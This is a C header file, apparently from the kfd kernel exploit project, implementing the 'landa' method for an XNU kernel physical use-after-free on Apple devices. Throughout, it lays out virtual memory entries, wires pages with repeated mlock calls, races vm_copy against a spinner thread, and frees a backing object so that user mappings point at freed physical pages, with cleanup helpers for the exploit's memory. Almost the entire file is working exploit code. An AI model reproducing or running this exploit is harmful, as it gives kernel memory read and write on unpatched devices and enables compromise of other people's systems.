/*
 * Copyright (c) 2023 Félix Poulin-Bélanger. All rights reserved.
 */

#ifndef landa_h
#define landa_h

u64 landa_vme1_size = pages(1);
u64 landa_vme2_size = pages(1);
const u64 landa_vme4_size = pages(1);

// Forward declarations for helper functions.
void* landa_helper_spinner_pthread(void* arg);

struct landa_data {
    atomic_bool main_thread_returned;
    atomic_bool spinner_thread_started;
    vm_address_t copy_src_address;
    vm_address_t copy_dst_address;
    vm_size_t copy_size;
    
    vm_address_t vme1_src_addr;
    vm_size_t    vme1_src_size;
    vm_address_t vme2_src_addr;
    vm_size_t    vme2_src_size;
    vm_address_t vme3_src_addr;
    vm_size_t    vme3_src_size;
    vm_address_t vme1_dst_addr;
    vm_size_t    vme1_dst_size;
    vm_address_t vme2_dst_addr;
    vm_size_t    vme2_dst_size;
    vm_address_t vme3_dst_addr;
    vm_size_t    vme3_dst_size;
};

void landa_init(struct kfd* kfd)
{
    kfd->puaf.puaf_method_data_size = sizeof(struct landa_data);
    kfd->puaf.puaf_method_data = malloc_bzero(kfd->puaf.puaf_method_data_size);
    
    // use default values for non-A8
    landa_vme1_size = pages(1);
    landa_vme2_size = pages(1);
    cpu_subtype_t cpuFamily = 0;
    size_t cpuFamilySize = sizeof(cpuFamily);
    sysctlbyname("hw.cpufamily", &cpuFamily, &cpuFamilySize, NULL, 0);
    if (cpuFamily == CPUFAMILY_ARM_TYPHOON) {
        // use pages(16) for A8. Not sure why this works.
        landa_vme1_size = pages(16);
        landa_vme2_size = pages(16);
    }
}

void landa_run(struct kfd* kfd)
{
    struct landa_data* landa = (struct landa_data*)(kfd->puaf.puaf_method_data);

    /*
     * Note:
     * - The size of [src/dst]_vme_3 must be equal to pages(X), i.e. the desired PUAF size.
     * - The copy_size must be greater than msg_ool_size_small (32 KiB), therefore it is
     *   sufficient for [src/dst]_vme_1 and [src/dst]_vme_2 to have a size of pages(1).
     */
    u64 landa_vme3_size = pages(kfd->puaf.number_of_puaf_pages);
    vm_size_t copy_size = landa_vme1_size + landa_vme2_size + landa_vme3_size;
    landa->copy_size = copy_size;

    /*
     * STEP 1A:
     *
     * Allocate the source VMEs and VMOs:
     * - src_vme_1 has a size of pages(1) and owns the only reference to src_vmo_1.
     * - src_vme_2 has a size of pages(1) and owns the only reference to src_vmo_2.
     * - src_vme_3 has a size of pages(X) and owns the only reference to src_vmo_3.
     */
    vm_address_t src_address = 0;
    vm_size_t src_size = copy_size;
    assert_mach(vm_allocate(mach_task_self(), &src_address, src_size, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR));
    landa->copy_src_address = src_address;

    vm_address_t vme1_src_address = src_address;
    vm_address_t vme2_src_address = vme1_src_address + landa_vme1_size;
    vm_address_t vme3_src_address = vme2_src_address + landa_vme2_size;
    assert_mach(vm_allocate(mach_task_self(), &vme1_src_address, landa_vme1_size, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE | VM_FLAGS_PURGABLE));
    assert_mach(vm_allocate(mach_task_self(), &vme2_src_address, landa_vme2_size, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE | VM_FLAGS_PURGABLE));
    assert_mach(vm_allocate(mach_task_self(), &vme3_src_address, landa_vme3_size, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE | VM_FLAGS_PURGABLE));

    landa->vme1_src_addr = vme1_src_address;
    landa->vme2_src_addr = vme2_src_address;
    landa->vme3_src_addr = vme3_src_address;
    landa->vme1_src_size = landa_vme1_size;
    landa->vme2_src_size = landa_vme2_size;
    landa->vme3_src_size = landa_vme3_size;
    
    memset((void*)(src_address), 'A', copy_size);

    /*
     * STEP 1B:
     *
     * Allocate the destination VMEs and VMOs:
     * - dst_vme_1 has a size of pages(1) and owns the only reference to dst_vmo_1.
     *   dst_vme_1->user_wired_count == MAX_WIRE_COUNT, because of the mlock() for-loop.
     * - dst_vme_2 has a size of pages(1) and owns the only reference to dst_vmo_2.
     *   dst_vme_2->is_shared == TRUE, because of the vm_remap() on itself.
     *   dst_vme_2->user_wired_count == 1, because of mlock().
     * - After the clip in vm_protect(), dst_vme_3 has a size of pages(X) and dst_vme_4 has a size of pages(1).
     *   dst_vme_3 and dst_vme_4 each have a reference to dst_vmo_3.
     */
    vm_address_t dst_address = 0;
    vm_size_t dst_size = copy_size + landa_vme4_size;
    assert_mach(vm_allocate(mach_task_self(), &dst_address, dst_size, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR));
    landa->copy_dst_address = dst_address;

    vm_address_t vme1_dst_address = dst_address;
    vm_address_t vme2_dst_address = vme1_dst_address + landa_vme1_size;
    vm_address_t vme3_dst_address = vme2_dst_address + landa_vme2_size;
    vm_address_t vme4_dst_address = vme3_dst_address + landa_vme3_size;
    vm_prot_t cur_protection = VM_PROT_DEFAULT;
    vm_prot_t max_protection = VM_PROT_ALL;
    assert_mach(vm_allocate(mach_task_self(), &vme1_dst_address, landa_vme1_size, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE | VM_FLAGS_PURGABLE));
    assert_mach(vm_allocate(mach_task_self(), &vme2_dst_address, landa_vme2_size, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE | VM_FLAGS_PURGABLE));
    assert_mach(vm_remap(mach_task_self(), &vme2_dst_address, landa_vme2_size, 0, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
        mach_task_self(), vme2_dst_address, FALSE, &cur_protection, &max_protection, VM_INHERIT_DEFAULT));
    assert_mach(vm_allocate(mach_task_self(), &vme3_dst_address, landa_vme3_size + landa_vme4_size, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE | VM_FLAGS_PURGABLE));
    assert_mach(vm_protect(mach_task_self(), vme4_dst_address, landa_vme4_size, FALSE, VM_PROT_READ));

    // vme4_dst_address will get deallocated by the exploit process
    landa->vme1_dst_addr = vme1_dst_address;
    landa->vme2_dst_addr = vme2_dst_address;
    landa->vme3_dst_addr = vme3_dst_address;
    landa->vme1_dst_size = landa_vme1_size;
    landa->vme2_dst_size = landa_vme2_size;
    landa->vme3_dst_size = landa_vme3_size;
    
    memset((void*)(dst_address), 'B', copy_size);

    for (u64 i = 0; i < UINT16_MAX; i++) {
        assert_bsd(mlock((void*)(vme1_dst_address), landa_vme1_size));
    }

    assert_bsd(mlock((void*)(vme2_dst_address), landa_vme2_size));

    /*
     * STEP 2:
     *
     * Trigger the race condition between vm_copy() in the main thread and mlock() in the spinner thread.
     */
    pthread_t spinner_thread = NULL;
    assert_bsd(pthread_create(&spinner_thread, NULL, landa_helper_spinner_pthread, kfd));

    while (!atomic_load(&landa->spinner_thread_started)) {
        usleep(10);
    }

    assert_mach(vm_copy(mach_task_self(), src_address, copy_size, dst_address));
    atomic_store(&landa->main_thread_returned, true);
    assert_bsd(pthread_join(spinner_thread, NULL));

    /*
     * STEP 3:
     *
     * Deallocate dst_vme_4, which will in turn deallocate the last reference of dst_vmo_3.
     * Therefore, dst_vmo_3 will be reaped and its pages put back on the free list.
     * However, we now have a PUAF on up to X of those pages in the VA range of dst_vme_3.
     */
    assert_mach(vm_deallocate(mach_task_self(), vme4_dst_address, landa_vme4_size));

    for (u64 i = 0; i < kfd->puaf.number_of_puaf_pages; i++) {
        kfd->puaf.puaf_pages_uaddr[i] = vme3_dst_address + pages(i);
    }
}

void landa_cleanup(struct kfd* kfd)
{
    struct landa_data* landa = (struct landa_data*)(kfd->puaf.puaf_method_data);
    u64 kread_page_uaddr = trunc_page(kfd->kread.krkw_object_uaddr);
    u64 kwrite_page_uaddr = trunc_page(kfd->kwrite.krkw_object_uaddr);

    u64 min_puaf_page_uaddr = min(kread_page_uaddr, kwrite_page_uaddr);
    u64 max_puaf_page_uaddr = max(kread_page_uaddr, kwrite_page_uaddr);

    assert_mach(vm_deallocate(mach_task_self(), landa->copy_src_address, landa->copy_size));

    vm_address_t address1 = landa->copy_dst_address;
    vm_size_t size1 = min_puaf_page_uaddr - landa->copy_dst_address;
    assert_mach(vm_deallocate(mach_task_self(), address1, size1));

    vm_address_t address2 = max_puaf_page_uaddr + pages(1);
    vm_size_t size2 = (landa->copy_dst_address + landa->copy_size) - address2;
    assert_mach(vm_deallocate(mach_task_self(), address2, size2));

    /*
     * No middle block if the kread and kwrite pages are the same or back-to-back.
     */
    if ((max_puaf_page_uaddr - min_puaf_page_uaddr) > pages(1)) {
        vm_address_t address3 = min_puaf_page_uaddr + pages(1);
        vm_size_t size3 = (max_puaf_page_uaddr - address3);
        assert_mach(vm_deallocate(mach_task_self(), address3, size3));
    }
}

void landa_free(struct kfd* kfd)
{
    u64 kread_page_uaddr = 0;
    u64 kwrite_page_uaddr = 0;
    if(kfd->kread.krkw_object_uaddr) {
        kread_page_uaddr = trunc_page(kfd->kread.krkw_object_uaddr);
        assert_mach(vm_deallocate(mach_task_self(), kread_page_uaddr, pages(1)));
    }
    if(kfd->kwrite.krkw_object_uaddr) {
        kwrite_page_uaddr = trunc_page(kfd->kwrite.krkw_object_uaddr);
        if (kwrite_page_uaddr != kread_page_uaddr) {
            assert_mach(vm_deallocate(mach_task_self(), kwrite_page_uaddr, pages(1)));
        }
    }
}

/*
 * Helper landa functions.
 */

void* landa_helper_spinner_pthread(void* arg)
{
    struct kfd* kfd = (struct kfd*)(arg);
    struct landa_data* landa = (struct landa_data*)(kfd->puaf.puaf_method_data);

    atomic_store(&landa->spinner_thread_started, true);

    while (!atomic_load(&landa->main_thread_returned)) {
        kern_return_t kret = mlock((void*)(landa->copy_dst_address), landa->copy_size);
        assert((kret == KERN_SUCCESS) || ((kret == (-1)) && (errno == ENOMEM)));
        if (kret == KERN_SUCCESS) {
            break;
        }
    }

    return NULL;
}

/*
 * Cleanup function in case of lander failure
 */

void landa_helper_deallocate(task_t task, unsigned int level, vm_address_t min, vm_address_t max,
                             vm_address_t tgt_addr, vm_size_t tgt_size)
{
    vm_region_submap_info_data_64_t info;
    vm_size_t size;
    mach_msg_type_number_t info_count = VM_REGION_SUBMAP_INFO_COUNT_64;
    unsigned int depth;
    
    for(vm_address_t addr = min; 1; addr += size) {
        // get next memory region
        depth = level;
        if(vm_region_recurse_64(task, &addr, &size, &depth, (vm_region_info_t)&info, &info_count) != KERN_SUCCESS) {
            break;
        }
        
        if(addr >= max) {
            addr = max;
        }
        
        if(addr >= max) {
            break;
        }
        
        if(tgt_addr == addr && tgt_size == size) {
            vm_deallocate(mach_task_self(), addr, size);
            return;
        }
        
        if(info.is_submap) {
            landa_helper_deallocate(task, level + 1, addr, addr + size, tgt_addr, tgt_size);
        }
    }
}

void landa_deallocate(struct kfd* kfd)
{
    struct landa_data* landa = (struct landa_data*)(kfd->puaf.puaf_method_data);
    landa_helper_deallocate(mach_task_self(), 0, 0, ~0, landa->vme1_src_addr, landa->vme1_src_size);
    landa_helper_deallocate(mach_task_self(), 0, 0, ~0, landa->vme2_src_addr, landa->vme2_src_size);
    landa_helper_deallocate(mach_task_self(), 0, 0, ~0, landa->vme3_src_addr, landa->vme3_src_size);
    landa_helper_deallocate(mach_task_self(), 0, 0, ~0, landa->vme1_dst_addr, landa->vme1_dst_size);
    landa_helper_deallocate(mach_task_self(), 0, 0, ~0, landa->vme2_dst_addr, landa->vme2_dst_size);
    landa_helper_deallocate(mach_task_self(), 0, 0, ~0, landa->vme3_dst_addr, landa->vme3_dst_size);
}

#endif /* landa_h */
